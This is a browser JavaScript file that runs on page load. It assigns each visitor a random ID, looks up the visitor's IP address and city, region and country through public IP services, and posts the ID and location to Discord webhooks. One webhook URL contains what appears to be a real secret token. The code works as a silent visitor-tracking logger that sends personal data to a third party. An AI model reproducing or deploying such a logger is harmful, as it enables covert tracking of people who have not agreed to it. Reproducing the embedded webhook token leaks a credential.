function generateUserId() {
  const userId = generateRandomNumber(16);
  localStorage.setItem("userId", userId);
  return userId;
}

function generateRandomNumber(length) {
  let result = "";
  const characters = "0123456789";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

function displayUserData() {
  const userId = localStorage.getItem("userId");
  if (!userId) {
    const newUserId = generateUserId();
    document.getElementById("userId").textContent = newUserId;
    sendUserData(newUserId);
  } else {
    document.getElementById("userId").textContent = userId;
    sendUserData(userId);
  }

  fetch("https://api.ipify.org/?format=json")
    .then((response) => response.json())
    .then((data) => {
      const ipElement = document.getElementById("ip");
      ipElement.textContent = data.ip;
      const locationElement = document.getElementById("location");
      getLocation(data.ip, locationElement);
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}

function sendUserData(userId) {
  const webhookURL = "https://discord.com/api/webhooks/1110583172917383238/oaoIQ92Lm2THQdTZ5CCSzozcSvwNbln1-5M7oyc27cUXaWKHaQipSJWzjxXTWt4vcXaz";
  const message = "User ID: " + userId;

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content: message })
  })
    .then((response) => console.log("Webhook sent successfully"))
    .catch((error) => console.error("Error sending webhook:", error));
}

function getLocation(ip, locationElement) {
  const locationUrl = `https://ipapi.co/${ip}/json/`;

  fetch(locationUrl)
    .then((response) => response.json())
    .then((data) => {
      const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
      locationElement.textContent = locationString;

      sendUserDataWithLocation(locationString);
    })
    .catch((error) => {
      console.error("Error:", error);
      sendUserDataWithLocation("Unknown");
    });
}

function sendUserDataWithLocation(location) {
  const userId = localStorage.getItem("userId");
  const webhookURL = "https://discord.com/api/webhooks/your-webhook-url"; // Replace with the actual webhook URL
  const message = "User ID: " + userId + "\nLocation: " + location;

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content: message })
  })
    .then((response) => console.log("Webhook sent successfully"))
    .catch((error) => console.error("Error sending webhook:", error));
}

displayUserData();
